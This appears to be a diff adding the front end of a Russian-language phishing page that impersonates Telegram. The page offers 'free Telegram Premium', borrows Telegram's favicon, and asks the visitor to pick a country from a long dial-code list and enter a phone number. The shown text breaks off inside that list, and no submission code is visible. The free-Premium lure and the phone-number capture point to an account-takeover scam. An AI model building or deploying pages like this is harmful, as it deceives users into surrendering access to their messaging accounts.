@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css"> 
+    <link rel="icon" type="image/png" sizes="144x144" href="https://web.telegram.org/k/assets/img/android-chrome-144x144.png?v=jw3mK7G9Ry">   
+    <title>Telegram Premium</title>
+</head>
+<body>
+    <div class="main">
+        <div id="ex1" class="modal">
+            <p>Некорректный ввод номера</p>
+            <a href="#" rel="modal:close">Close</a>
+        </div>        
+        <div class="header"></div>
+        <div class="content">
+            <div id="form_hello" class="form">
+                <div class="logo">
+                    <img src="media/logo.png" alt="">
+                </div>
+                <div class="title">Telegram Premium</div>
+                <div class="desc">Бесплатный доступ к расширенной версии Telegram</div>
+                <span id="to_form_start_process" class="btn_primary">Продолжить</span>
+                <a id="info_prem" href="https://telegram.org/faq_premium" class="btn_secondary">Преимущетсва</a>
+            </div>
+            <div id="form_start_process" class="form">
+                <div class="logo">
+                    <img src="media/logo.png" alt="">
+                </div>
+                <div class="title">Telegram Premium</div>
+                <div class="desc">Пожалуйста, выберите свою страну и введите номер телефона</div>
+                <div class="dropdown_countries">
+                    <div data-country-code="AU" data-phone-code="+61" title="Австралия" class="dc_option">
+                        <img src="flags/AU.png" alt="Австралия">
+                        <span class="country_name">Автралия</span>
+                    </div>
+                    <div data-country-code="AT" data-phone-code="+43" title="Австрия" class="dc_option">
+                        <img src="flags/AT.png" alt="Австрия">
+                        <span class="country_name">Австрия</span>
+                    </div>
+                    <div data-country-code="AZ" data-phone-code="+994" title="Азербайджан" class="dc_option">
+                        <img src="flags/AZ.png" alt="Азербайджан">
+                        <span class="country_name">Азербайджан</span>
+                    </div>
+                    <div data-country-code="AL" data-phone-code="+355" title="Албания" class="dc_option">
+                        <img src="flags/AL.png" alt="Албания">
+                        <span class="country_name">Албания</span>
+                    </div>
+                    <div data-country-code="DZ" data-phone-code="+213" title="Алжир" class="dc_option">
+                        <img src="flags/DZ.png" alt="Алжир">
+                        <span class="country_name">Алжир</span>
+                    </div>
+                    <div data-country-code="AS" data-phone-code="+1" title="Американское Самоа" class="dc_option">
+                        <img src="flags/AS.png" alt="Американское Самоа">
+                        <span class="country_name">Американское Самоа</span>
+                    </div>
+                    <div data-country-code="AI" data-phone-code="+1" title="Ангилья" class="dc_option">
+                        <img src="flags/AI.png" alt="Ангилья">
+                        <span class="country_name">Ангилья</span>
+                    </div>
+                    <div data-country-code="AO" data-phone-code="+244" title="Ангола" class="dc_option">
+                        <img src="flags/AO.png" alt="Ангола">
+                        <span class="country_name">Ангола</span>
+                    </div>
+                    <div data-country-code="AD" data-phone-code="+376" title="Андорра" class="dc_option">
+                        <img src="flags/AD.png" alt="Андорра">
+                        <span class="country_name">Андорра</span>
+                    </div>
+                    <div data-country-code="AG" data-phone-code="+1" title="Антигуа и Барбуда" class="dc_option">
+                        <img src="flags/AG.png" alt="Антигуа и Барбуда">
+                        <span class="country_name">Антигуа и Барбуда</span>
+                    </div>
+                    <div data-country-code="AR" data-phone-code="+54" title="Аргентина" class="dc_option">
+                        <img src="flags/AR.png" alt="Аргентина">
+                        <span class="country_name">Аргентина</span>
+                    </div>
+                    <div data-country-code="AM" data-phone-code="+374" title="Армения" class="dc_option">
+                        <img src="flags/AM.png" alt="Армения">
+                        <span class="country_name">Армения</span>
+                    </div>
+                    <div data-country-code="AW" data-phone-code="+297" title="Аруба" class="dc_option">
+                        <img src="flags/AW.png" alt="Аруба">
+                        <span class="country_name">Аруба</span>
+                    </div>
+                    <div data-country-code="AF" data-phone-code="+93" title="Афганистан" class="dc_option">
+                        <img src="flags/AF.png" alt="Афганистан">
+                        <span class="country_name">Афганистан</span>
+                    </div>
+                    <div data-country-code="BS" data-phone-code="+1" title="Багамские Острова" class="dc_option">
+                        <img src="flags/BS.png" alt="Багамские Острова">
+                        <span class="country_name">Багамские Острова</span>
+                    </div>
+                    <div data-country-code="BD" data-phone-code="+880" title="Бангладеш" class="dc_option">
+                        <img src="flags/BD.png" alt="Бангладеш">
+                        <span class="country_name">Бангладеш</span>
+                    </div>
+                    <div data-country-code="BB" data-phone-code="+1" title="Барбадос" class="dc_option">
+                        <img src="flags/BB.png" alt="Барбадос">
+                        <span class="country_name">Барбадос</span>
+                    </div>
+                    <div data-country-code="BH" data-phone-code="+973" title="Бахрейн" class="dc_option">
+                        <img src="flags/BH.png" alt="Бахрейн">
+                        <span class="country_name">Бахрейн</span>
+                    </div>
+                    <div data-country-code="BZ" data-phone-code="+501" title="Белиз" class="dc_option">
+                        <img src="flags/BZ.png" alt="Белиз">
+                        <span class="country_name">Белиз</span>
+                    </div>
+                    <div data-country-code="BY" data-phone-code="+375" title="Белоруссия" class="dc_option">
+                        <img src="flags/BY.png" alt="Белоруссия">
+                        <span class="country_name">Белоруссия</span>
+                    </div>
+                    <div data-country-code="BE" data-phone-code="+32" title="Бельгия" class="dc_option">
+                        <img src="flags/BE.png" alt="Бельгия">
+                        <span class="country_name">Бельгия</span>
+                    </div>
+                    <div data-country-code="BJ" data-phone-code="+229" title="Бенин" class="dc_option">
+                        <img src="flags/BJ.png" alt="Бенин">
+                        <span class="country_name">Бенин</span>
+                    </div>
+                    <div data-country-code="BM" data-phone-code="+1" title="Бермудские Острова" class="dc_option">
+                        <img src="flags/BM.png" alt="Бермудские Острова">
+                        <span class="country_name">Бермудские Острова</span>
+                    </div>
+                    <div data-country-code="BG" data-phone-code="+359" title="Болгария" class="dc_option">
+                        <img src="flags/BG.png" alt="Болгария">
+                        <span class="country_name">Болгария</span>
+                    </div>
+                    <div data-country-code="BO" data-phone-code="+591" title="Боливия" class="dc_option">
+                        <img src="flags/BO.png" alt="Боливия">
+                        <span class="country_name">Боливия</span>
+                    </div>
+                    <div data-country-code="BA" data-phone-code="+387" title="Босния и Герцеговина" class="dc_option">
+                        <img src="flags/BA.png" alt="Босния и Герцеговина">
+                        <span class="country_name">Босния и Герцеговина</span>
+                    </div>
+                    <div data-country-code="BW" data-phone-code="+267" title="Ботсвана" class="dc_option">
+                        <img src="flags/BW.png" alt="Ботсвана">
+                        <span class="country_name">Ботсвана</span>
+                    </div>
+                    <div data-country-code="BR" data-phone-code="+55" title="Бразилия" class="dc_option">
+                        <img src="flags/BR.png" alt="Бразилия">
+                        <span class="country_name">Бразилия</span>
+                    </div>
+                    <div data-country-code="BN" data-phone-code="+673" title="Бруней" class="dc_option">
+                        <img src="flags/BN.png" alt="Бруней">
+                        <span class="country_name">Бруней</span>
+                    </div>
+                    <div data-country-code="BF" data-phone-code="+226" title="Буркина-Фасо" class="dc_option">
+                        <img src="flags/BF.png" alt="Буркина-Фасо">
+                        <span class="country_name">Буркина-Фасо</span>
+                    </div>
+                    <div data-country-code="BI" data-phone-code="+257" title="Бурунди" class="dc_option">
+                        <img src="flags/BI.png" alt="Бурунди">
+                        <span class="country_name">Бурунди</span>
+                    </div>
+                    <div data-country-code="BT" data-phone-code="+975" title="Бутан" class="dc_option">
+                        <img src="flags/BT.png" alt="Бутан">
+                        <span class="country_name">Бутан</span>
+                    </div>
+                    <div data-country-code="VU" data-phone-code="+678" title="Вануату" class="dc_option">
+                        <img src="flags/VU.png" alt="Вануату">
+                        <span class="country_name">Вануату</span>
+                    </div>
+                    <div data-country-code="GB" data-phone-code="+44" title="Великобритания" class="dc_option">
+                        <img src="flags/GB.png" alt="Великобритания">
+                        <span class="country_name">Великобритания</span>
+                    </div>
+                    <div data-country-code="HU" data-phone-code="+36" title="Венгрия" class="dc_option">
+                        <img src="flags/HU.png" alt="Венгрия">
+                        <span class="country_name">Венгрия</span>
+                    </div>
+                    <div data-country-code="VE" data-phone-code="+58" title="Венесуэла" class="dc_option">
+                        <img src="flags/VE.png" alt="Венесуэла">
+                        <span class="country_name">Венесуэла</span>
+                    </div>
+                    <div data-country-code="VG" data-phone-code="+1" title="Виргинские Острова (Великобритания)" class="dc_option">
+                        <img src="flags/VG.png" alt="Виргинские Острова (Великобритания)">
+                        <span class="country_name">Виргинские Острова (Великобритания)</span>
+                    </div>
+                    <div data-country-code="VI" data-phone-code="+1" title="Виргинские Острова (США)" class="dc_option">
+                        <img src="flags/VI.png" alt="Виргинские Острова (США)">
+                        <span class="country_name">Виргинские Острова (США)</span>
+                    </div>
+                    <div data-country-code="TL" data-phone-code="+670" title="Восточный Тимор" class="dc_option">
+                        <img src="flags/TL.png" alt="Восточный Тимор">
+                        <span class="country_name">Восточный Тимор</span>
+                    </div>
+                    <div data-country-code="VN" data-phone-code="+84" title="Вьетнам" class="dc_option">
+                        <img src="flags/VN.png" alt="Вьетнам">
+                        <span class="country_name">Вьетнам</span>
+                    </div>
+                    <div data-country-code="GA" data-phone-code="+241" title="Габон" class="dc_option">
+                        <img src="flags/GA.png" alt="Габон">
+                        <span class="country_name">Габон</span>
+                    </div>
+                    <div data-country-code="HT" data-phone-code="+509" title="Гаити" class="dc_option">
+                        <img src="flags/HT.png" alt="Гаити">
+                        <span class="country_name">Гаити</span>
+                    </div>
+                    <div data-country-code="GY" data-phone-code="+592" title="Гайана" class="dc_option">
+                        <img src="flags/GY.png" alt="Гайана">
+                        <span class="country_name">Гайана</span>
+                    </div>
+                    <div data-country-code="GM" data-phone-code="+220" title="Гамбия" class="dc_option">
+                        <img src="flags/GM.png" alt="Гамбия">
+                        <span class="country_name">Гамбия</span>
+                    </div>
+                    <div data-country-code="GH" data-phone-code="+233" title="Гана" class="dc_option">
+                        <img src="flags/GH.png" alt="Гана">
+                        <span class="country_name">Гана</span>
+                    </div>
+                    <div data-country-code="GP" data-phone-code="+590" title="Гваделупа" class="dc_option">
+                        <img src="flags/GP.png" alt="Гваделупа">
+                        <span class="country_name">Гваделупа</span>
+                    </div>
+                    <div data-country-code="GT" data-phone-code="+502" title="Гватемала" class="dc_option">
+                        <img src="flags/GT.png" alt="Гватемала">
+                        <span class="country_name">Гватемала</span>
+                    </div>
+                    <div data-country-code="GN" data-phone-code="+224" title="Гвинея" class="dc_option">
+                        <img src="flags/GN.png" alt="Гвинея">
+                        <span class="country_name">Гвинея</span>
+                    </div>
+                    <div data-country-code="GW" data-phone-code="+245" title="Гвинея-Бисау" class="dc_option">
+                        <img src="flags/GW.png" alt="Гвинея-Бисау">
+                        <span class="country_name">Гвинея-Бисау</span>
+                    </div>
+                    <div data-country-code="DE" data-phone-code="+49" title="Германия" class="dc_option">
+                        <img src="flags/DE.png" alt="Германия">
+                        <span class="country_name">Германия</span>
+                    </div>
+                    <div data-country-code="GI" data-phone-code="+350" title="Гибралтар" class="dc_option">
+                        <img src="flags/GI.png" alt="Гибралтар">
+                        <span class="country_name">Гибралтар</span>
+                    </div>
+                    <div data-country-code="HN" data-phone-code="+504" title="Гондурас" class="dc_option">
+                        <img src="flags/HN.png" alt="Гондурас">
+                        <span class="country_name">Гондурас</span>
+                    </div>
+                    <div data-country-code="HK" data-phone-code="+852" title="Гонконг (САР)" class="dc_option">
+                        <img src="flags/HK.png" alt="Гонконг (САР)">
+                        <span class="country_name">Гонконг (САР)</span>
+                    </div>
+                    <div data-country-code="GD" data-phone-code="+1473" title="Гренада" class="dc_option">
+                        <img src="flags/GD.png" alt="Гренада">
+                        <span class="country_name">Гренада</span>
+                    </div>
+                    <div data-country-code="GL" data-phone-code="+299" title="Гренландия" class="dc_option">
+                        <img src="flags/GL.png" alt="Гренландия">
+                        <span class="country_name">Гренландия</span>
+                    </div>
+                    <div data-country-code="GR" data-phone-code="+30" title="Греция" class="dc_option">
+                        <img src="flags/GR.png" alt="Греция">
+                        <span class="country_name">Греция</span>
+                    </div>
+                    <div data-country-code="GE" data-phone-code="+995" title="Грузия" class="dc_option">
+                        <img src="flags/GE.png" alt="Грузия">
+                        <span class="country_name">Грузия</span>
+                    </div>
+                    <div data-country-code="GU" data-phone-code="+1671" title="Гуам" class="dc_option">
+                        <img src="flags/GU.png" alt="Гуам">
+                        <span class="country_name">Гуам</span>
+                    </div>
+                    <div data-country-code="DK" data-phone-code="+45" title="Дания" class="dc_option">
+                        <img src="flags/DK.png" alt="Дания">
+                        <span class="country_name">Дания</span>
+                    </div>
+                    <div data-country-code="DJ" data-phone-code="+253" title="Джибути" class="dc_option">
+                        <img src="flags/DJ.png" alt="Джибути">
+                        <span class="country_name">Джибути</span>
+                    </div>
+                    <div data-country-code="DM" data-phone-code="+1767" title="Доминика" class="dc_option">
+                        <img src="flags/DM.png" alt="Доминика">
+                        <span class="country_name">Доминика</span>
+                    </div>
+                    <div data-country-code="DO" data-phone-code="+1809" title="Доминиканская Республика" class="dc_option">
+                        <img src="flags/DO.png" alt="Доминиканская Республика">
+                        <span class="country_name">Доминиканская Республика</span>
+                    </div>
+                    <div data-country-code="EG" data-phone-code="+20" title="Египет" class="dc_option">
+                        <img src="flags/EG.png" alt="Египет">
+                        <span class="country_name">Египет</span>
+                    </div>
+                    <div data-country-code="ZM" data-phone-code="+260" title="Замбия" class="dc_option">
+                        <img src="flags/ZM.png" alt="Замбия">
+                        <span class="country_name">Замбия</span>
+                    </div>
+                    <div data-country-code="ZW" data-phone-code="+263" title="Зимбабве" class="dc_option">
+                        <img src="flags/ZW.png" alt="Зимбабве">
+                        <span class="country_name">Зимбабве</span>
+                    </div>
+                    <div data-country-code="IL" data-phone-code="+972" title="Израиль" class="dc_option">
+                        <img src="flags/IL.png" alt="Израиль">
+                        <span class="country_name">Израиль</span>
+                    </div>
+                    <div data-country-code="IN" data-phone-code="+91" title="Индия" class="dc_option">
+                        <img src="flags/IN.png" alt="Индия">
+                        <span class="country_name">Индия</span>
+                    </div>
+                    <div data-country-code="ID" data-phone-code="+62" title="Индонезия" class="dc_option">
+                        <img src="flags/ID.png" alt="Индонезия">
+                        <span class="country_name">Индонезия</span>
+                    </div>
+                    <div data-country-code="JO" data-phone-code="+962" title="Иордания" class="dc_option">
+                        <img src="flags/JO.png" alt="Иордания">
+                        <span class="country_name">Иордания</span>
+                    </div>
+                    <div data-country-code="IQ" data-phone-code="+964" title="Ирак" class="dc_option">
+                        <img src="flags/IQ.png" alt="Ирак">
+                        <span class="country_name">Ирак</span>
+                    </div>
+                    <div data-country-code="IR" data-phone-code="+98" title="Иран" class="dc_option">
+                        <img src="flags/IR.png" alt="Иран">
+                        <span class="country_name">Иран</span>
+                    </div>
+                    <div data-country-code="IE" data-phone-code="+353" title="Ирландия" class="dc_option">
+                        <img src="flags/IE.png" alt="Ирландия">
+                        <span class="country_name">Ирландия</span>
+                    </div>
+                    <div data-country-code="IS" data-phone-code="+354" title="Исландия" class="dc_option">
+                        <img src="flags/IS.png" alt="Исландия">
+                        <span class="country_name">Исландия</span>
+                    </div>
+                    <div data-country-code="ES" data-phone-code="+34" title="Испания" class="dc_option">
+                        <img src="flags/ES.png" alt="Испания">
+                        <span class="country_name">Испания</span>
+                    </div>
+                    <div data-country-code="IT" data-phone-code="+39" title="Италия" class="dc_option">
+                        <img src="flags/IT.png" alt="Италия">
+                        <span class="country_name">Италия</span>
+                    </div>
+                    <div data-country-code="YE" data-phone-code="+967" title="Йемен" class="dc_option">
+                        <img src="flags/YE.png" alt="Йемен">
+                        <span class="country_name">Йемен</span>
+                    </div>
+                    <div data-country-code="CV" data-phone-code="+238" title="Кабо-Верде" class="dc_option">
+                        <img src="flags/CV.png" alt="Кабо-Верде">
+                        <span class="country_name">Кабо-Верде</span>
+                    </div>
+                    <div data-country-code="KZ" data-phone-code="+7" title="Казахстан" class="dc_option">
+                        <img src="flags/KZ.png" alt="Казахстан">
+                        <span class="country_name">Казахстан</span>
+                    </div>
+                    <div data-country-code="KY" data-phone-code="+1345" title="Каймановы острова" class="dc_option">
+                        <img src="flags/KY.png" alt="Каймановы острова">
+                        <span class="country_name">Каймановы острова</span>
+                    </div>
+                    <div data-country-code="KH" data-phone-code="+855" title="Камбоджа" class="dc_option">
+                        <img src="flags/KH.png" alt="Камбоджа">
+                        <span class="country_name">Камбоджа</span>
+                    </div>
+                    <div data-country-code="CM" data-phone-code="+237" title="Камерун" class="dc_option">
+                        <img src="flags/CM.png" alt="Камерун">
+                        <span class="country_name">Камерун</span>
+                    </div>
+                    <div data-country-code="CA" data-phone-code="+1" title="Канада" class="dc_option">
+                        <img src="flags/CA.png" alt="Канада">
+                        <span class="country_name">Канада</span>
+                    </div>
+                    <div data-country-code="QA" data-phone-code="+974" title="Катар" class="dc_option">
+                        <img src="flags/QA.png" alt="Катар">
+                        <span class="country_name">Катар</span>
+                    </div>
+                    <div data-country-code="KE" data-phone-code="+254" title="Кения" class="dc_option">
+                        <img src="flags/KE.png" alt="Кения">
+                        <span class="country_name">Кения</span>
+                    </div>
+                    <div data-country-code="CY" data-phone-code="+357" title="Кипр" class="dc_option">
+                        <img src="flags/CY.png" alt="Кипр">
+                        <span class="country_name">Кипр</span>
+                    </div>
+                    <div data-country-code="KG" data-phone-code="+996" title="Киргизия" class="dc_option">
+                        <img src="flags/KG.png" alt="Киргизия">
+                        <span class="country_name">Киргизия</span>
+                    </div>
+                    <div data-country-code="KI" data-phone-code="+686" title="Кирибати" class="dc_option">
+                        <img src="flags/KI.png" alt="Кирибати">
+                        <span class="country_name">Кирибати</span>
+                    </div>
+                    <div data-country-code="CN" data-phone-code="+86" title="Китай" class="dc_option">
+                        <img src="flags/CN.png" alt="Китай">
+                        <span class="country_name">Китай</span>
+                    </div>
+                    <div data-country-code="KP" data-phone-code="+850" title="КНДР" class="dc_option">
+                        <img src="flags/KP.png" alt="КНДР">
+                        <span class="country_name">КНДР</span>
+                    </div>
+                    <div data-country-code="CO" data-phone-code="+57" title="Колумбия" class="dc_option">
+                        <img src="flags/CO.png" alt="Колумбия">
+                        <span class="country_name">Колумбия</span>
+                    </div>
+                    <div data-country-code="KM" data-phone-code="+269" title="Коморы" class="dc_option">
+                        <img src="flags/KM.png" alt="Коморы">
+                        <span class="country_name">Коморы</span>
+                    </div>
+                    <div data-country-code="CG" data-phone-code="+242" title="Конго" class="dc_option">
+                        <img src="flags/CG.png" alt="Конго">
+                        <span class="country_name">Конго</span>
+                    </div>
+                    <div data-country-code="CD" data-phone-code="+243" title="Демократическая Республика Конго" class="dc_option">
+                        <img src="flags/CD.png" alt="Демократическая Республика Конго">
+                        <span class="country_name">Демократическая Республика Конго</span>
+                    </div>
+                    <div data-country-code="CK" data-phone-code="+682" title="Острова Кука" class="dc_option">
+                        <img src="flags/CK.png" alt="Острова Кука">
+                        <span class="country_name">Острова Кука</span>
+                    </div>
+                    <div data-country-code="CR" data-phone-code="+506" title="Коста-Рика" class="dc_option">
+                        <img src="flags/CR.png" alt="Коста-Рика">
+                        <span class="country_name">Коста-Рика</span>
+                    </div>
+                    <div data-country-code="CI" data-phone-code="+225" title="Кот-д’Ивуар" class="dc_option">
+                        <img src="flags/CI.png" alt="Кот-д’Ивуар">
+                        <span class="country_name">Кот-д’Ивуар</span>
+                    </div>
+                    <div data-country-code="CU" data-phone-code="+53" title="Куба" class="dc_option">
+                        <img src="flags/CU.png" alt="Куба">
+                        <span class="country_name">Куба</span>
+                    </div>
+                    <div data-country-code="KW" data-phone-code="+965" title="Кувейт" class="dc_option">
+                        <img src="flags/KW.png" alt="Кувейт">
+                        <span class="country_name">Кувейт</span>
+                    </div>
+                    <div data-country-code="CW" data-phone-code="+599" title="Кюрасао" class="dc_option">
+                        <img src="flags/CW.png" alt="Кюрасао">
+                        <span class="country_name">Кюрасао</span>
+                    </div>
+                    <div data-country-code="LA" data-phone-code="+856" title="Лаос" class="dc_option">
+                        <img src="flags/LA.png" alt="Лаос">
+                        <span class="country_name">Лаос</span>
+                    </div>
+                    <div data-country-code="LV" data-phone-code="+371" title="Латвия" class="dc_option">
+                        <img src="flags/LV.png" alt="Латвия">
+                        <span class="country_name">Латвия</span>
+                    </div>
+                    <div data-country-code="LS" data-phone-code="+266" title="Лесото" class="dc_option">
+                        <img src="flags/LS.png" alt="Лесото">
+                        <span class="country_name">Лесото</span>
+                    </div>
+                    <div data-country-code="LR" data-phone-code="+231" title="Либерия" class="dc_option">
+                        <img src="flags/LR.png" alt="Либерия">
+                        <span class="country_name">Либерия</span>
+                    </div>
+                    <div data-country-code="LB" data-phone-code="+961" title="Ливан" class="dc_option">
+                        <img src="flags/LB.png" alt="Ливан">
+                        <span class="country_name">Ливан</span>
+                    </div>
+                    <div data-country-code="LY" data-phone-code="+218" title="Ливия" class="dc_option">
+                        <img src="flags/LY.png" alt="Ливия">
+                        <span class="country_name">Ливия</span>
+                    </div>
+                    <div data-country-code="LI" data-phone-code="+423" title="Лихтенштейн" class="dc_option">
+                        <img src="flags/LI.png" alt="Лихтенштейн">
+                        <span class="country_name">Лихтенштейн</span>
+                    </div>
+                    <div data-country-code="LT" data-phone-code="+370" title="Литва" class="dc_option">
+                        <img src="flags/LT.png" alt="Литва">
+                        <span class="country_name">Литва</span>
+                    </div>
+                    <div data-country-code="LU" data-phone-code="+352" title="Люксембург" class="dc_option">
+                        <img src="flags/LU.png" alt="Люксембург">
+                        <span class="country_name">Люксембург</span>
+                    </div>
+                    <div data-country-code="MU" data-phone-code="+230" title="Маврикий" class="dc_option">
+                        <img src="flags/MU.png" alt="Маврикий">
+                        <span class="country_name">Маврикий</span>
+                    </div>
+                    <div data-country-code="MR" data-phone-code="+222" title="Мавритания" class="dc_option">
+                        <img src="flags/MR.png" alt="Мавритания">
+                        <span class="country_name">Мавритания</span>
+                    </div>
+                    <div data-country-code="MG" data-phone-code="+261" title="Мадагаскар" class="dc_option">
+                        <img src="flags/MG.png" alt="Мадагаскар">
+                        <span class="country_name">Мадагаскар</span>
+                    </div>
+                    <div data-country-code="MO" data-phone-code="+853" title="Макао" class="dc_option">
+                        <img src="flags/MO.png" alt="Макао">
+                        <span class="country_name">Макао</span>
+                    </div>
+                    <div data-country-code="MK" data-phone-code="+389" title="Македония" class="dc_option">
+                        <img src="flags/MK.png" alt="Македония">
+                        <span class="country_name">Македония</span>
+                    </div>
+                    <div data-country-code="MW" data-phone-code="+265" title="Малави" class="dc_option">
+                        <img src="flags/MW.png" alt="Малави">
+                        <span class="country_name">Малави</span>
+                    </div>
+                    <div data-country-code="MY" data-phone-code="+60" title="Малайзия" class="dc_option">
+                        <img src="flags/MY.png" alt="Малайзия">
+                        <span class="country_name">Малайзия</span>
+                    </div>
+                    <div data-country-code="ML" data-phone-code="+223" title="Мали" class="dc_option">
+                        <img src="flags/ML.png" alt="Мали">
+                        <span class="country_name">Мали</span>
+                    </div>
+                    <div data-country-code="MV" data-phone-code="+960" title="Мальдивы" class="dc_option">
+                        <img src="flags/MV.png" alt="Мальдивы">
+                        <span class="country_name">Мальдивы</span>
+                    </div>
+                    <div data-country-code="MT" data-phone-code="+356" title="Мальта" class="dc_option">
+                        <img src="flags/MT.png" alt="Мальта">
+                        <span class="country_name">Мальта</span>
+                    </div>
+                    <div data-country-code="MA" data-phone-code="+212" title="Марокко" class="dc_option">
+                        <img src="flags/MA.png" alt="Марокко">
+                        <span class="country_name">Марокко</span>
+                    </div>
+                    <div data-country-code="MQ" data-phone-code="+596" title="Мартиника" class="dc_option">
+                        <img src="flags/MQ.png" alt="Мартиника">
+                        <span class="country_name">Мартиника</span>
+                    </div>
+                    <div data-country-code="MH" data-phone-code="+692" title="Маршалловы Острова" class="dc_option">
+                        <img src="flags/MH.png" alt="Маршалловы Острова">
+                        <span class="country_name">Маршалловы Острова</span>
+                    </div>
+                    <div data-country-code="MX" data-phone-code="+52" title="Мексика" class="dc_option">
+                        <img src="flags/MX.png" alt="Мексика">
+                        <span class="country_name">Мексика</span>
+                    </div>
+                    <div data-country-code="FM" data-phone-code="+691" title="Микронезия" class="dc_option">
+                        <img src="flags/FM.png" alt="Микронезия">
+                        <span class="country_name">Микронезия</span>
+                    </div>
+                    <div data-country-code="MZ" data-phone-code="+258" title="Мозамбик" class="dc_option">
+                        <img src="flags/MZ.png" alt="Мозамбик">
+                        <span class="country_name">Мозамбик</span>
+                    </div>
+                    <div data-country-code="MD" data-phone-code="+373" title="Молдова" class="dc_option">
+                        <img src="flags/MD.png" alt="Молдова">
+                        <span class="country_name">Молдова</span>
+                    </div>
+                    <div data-country-code="MC" data-phone-code="+377" title="Монако" class="dc_option">
+                        <img src="flags/MC.png" alt="Монако">
+                        <span class="country_name">Монако</span>
+                    </div>
+                    <div data-country-code="MN" data-phone-code="+976" title="Монголия" class="dc_option">
+                        <img src="flags/MN.png" alt="Монголия">
+                        <span class="country_name">Монголия</span>
+                    </div>
+                    <div data-country-code="MS" data-phone-code="+1664" title="Монтсеррат" class="dc_option">
+                        <img src="flags/MS.png" alt="Монтсеррат">
+                        <span class="country_name">Монтсеррат</span>
+                    </div>
+                    <div data-country-code="MM" data-phone-code="+95" title="Мьянма" class="dc_option">
+                        <img src="flags/MM.png" alt="Мьянма">
+                        <span class="country_name">Мьянма</span>
+                    </div>
+                    <div data-country-code="NA" data-phone-code="+264" title="Намибия" class="dc_option">
+                        <img src="flags/NA.png" alt="Намибия">
+                        <span class="country_name">Намибия</span>
+                    </div>
+                    <div data-country-code="NR" data-phone-code="+674" title="Науру" class="dc_option">
+                        <img src="flags/NR.png" alt="Науру">
+                        <span class="country_name">Науру</span>
+                    </div>
+                    <div data-country-code="NP" data-phone-code="+977" title="Непал" class="dc_option">
+                        <img src="flags/NP.png" alt="Непал">
+                        <span class="country_name">Непал</span>
+                    </div>
+                    <div data-country-code="NE" data-phone-code="+227" title="Нигер" class="dc_option">
+                        <img src="flags/NE.png" alt="Нигер">
+                        <span class="country_name">Нигер</span>
+                    </div>
+                    <div data-country-code="NG" data-phone-code="+234" title="Нигерия" class="dc_option">
+                        <img src="flags/NG.png" alt="Нигерия">
+                        <span class="country_name">Нигерия</span>
+                    </div>
+                    <div data-country-code="NL" data-phone-code="+31" title="Нидерланды" class="dc_option">
+                        <img src="flags/NL.png" alt="Нидерланды">
+                        <span class="country_name">Нидерланды</span>
+                    </div>
+                    <div data-country-code="NI" data-phone-code="+505" title="Никарагуа" class="dc_option">
+                        <img src="flags/NI.png" alt="Никарагуа">
+                        <span class="country_name">Никарагуа</span>
+                    </div>
+                    <div data-country-code="NU" data-phone-code="+683" title="Ниуэ" class="dc_option">
+                        <img src="flags/NU.png" alt="Ниуэ">
+                        <span class="country_name">Ниуэ</span>
+                    </div>
+                    <div data-country-code="NZ" data-phone-code="+64" title="Новая Зеландия" class="dc_option">
+                        <img src="flags/NZ.png" alt="Новая Зеландия">
+                        <span class="country_name">Новая Зеландия</span>
+                    </div>
+                    <div data-country-code="NC" data-phone-code="+687" title="Новая Каледония" class="dc_option">
+                        <img src="flags/NC.png" alt="Новая Каледония">
+                        <span class="country_name">Новая Каледония</span>
+                    </div>
+                    <div data-country-code="NO" data-phone-code="+47" title="Норвегия" class="dc_option">
+                        <img src="flags/NO.png" alt="Норвегия">
+                        <span class="country_name">Норвегия</span>
+                    </div>
+                    <div data-country-code="AE" data-phone-code="+971" title="Объединенные Арабские Эмираты" class="dc_option">
+                        <img src="flags/AE.png" alt="Объединенные Арабские Эмираты">
+                        <span class="country_name">Объединенные Арабские Эмираты</span>
+                    </div>
+                    <div data-country-code="OM" data-phone-code="+968" title="Оман" class="dc_option">
+                        <img src="flags/OM.png" alt="Оман">
+                        <span class="country_name">Оман</span>
+                    </div>
+                    <div data-country-code="NF" data-phone-code="+672" title="Остров Норфолк" class="dc_option">
+                        <img src="flags/NF.png" alt="Остров Норфолк">
+                        <span class="country_name">Остров Норфолк</span>
+                    </div>
+                    <div data-country-code="SH" data-phone-code="+290" title="Остров Святой Елены" class="dc_option">
+                        <img src="flags/SH.png" alt="Остров Святой Елены">
+                        <span class="country_name">Остров Святой Елены</span>
+                    </div>
+                    <div data-country-code="CK" data-phone-code="+682" title="Острова Кука" class="dc_option">
+                        <img src="flags/CK.png" alt="Острова Кука">
+                        <span class="country_name">Острова Кука</span>
+                    </div>
+                    <div data-country-code="PK" data-phone-code="+92" title="Пакистан" class="dc_option">
+                        <img src="flags/PK.png" alt="Пакистан">
+                        <span class="country_name">Пакистан</span>
+                    </div>
+                    <div data-country-code="PW" data-phone-code="+680" title="Палау" class="dc_option">
+                        <img src="flags/PW.png" alt="Палау">
+                        <span class="country_name">Палау</span>
+                    </div>
+                    <div data-country-code="PS" data-phone-code="+970" title="Палестина" class="dc_option">
+                        <img src="flags/PS.png" alt="Палестина">
+                        <span class="country_name">Палестина</span>
+                    </div>
+                    <div data-country-code="PA" data-phone-code="+507" title="Панама" class="dc_option">
+                        <img src="flags/PA.png" alt="Панама">
+                        <span class="country_name">Панама</span>
+                    </div>
+                    <div data-country-code="PG" data-phone-code="+675" title="Папуа — Новая Гвинея" class="dc_option">
+                        <img src="flags/PG.png" alt="Папуа — Новая Гвинея">
+                        <span class="country_name">Папуа — Новая Гвинея</span>
+                    </div>
+                    <div data-country-code="PY" data-phone-code="+595" title="Парагвай" class="dc_option">
+                        <img src="flags/PY.png" alt="Парагвай">
+                        <span class="country_name">Парагвай</span>
+                    </div>
+                    <div data-country-code="PE" data-phone-code="+51" title="Перу" class="dc_option">
+                        <img src="flags/PE.png" alt="Перу">
+                        <span class="country_name">Перу</span>
+                    </div>
+                    <div data-country-code="PL" data-phone-code="+48" title="Польша" class="dc_option">
+                        <img src="flags/PL.png" alt="Польша">
+                        <span class="country_name">Польша</span>
+                    </div>
+                    <div data-country-code="PT" data-phone-code="+351" title="Португалия" class="dc_option">
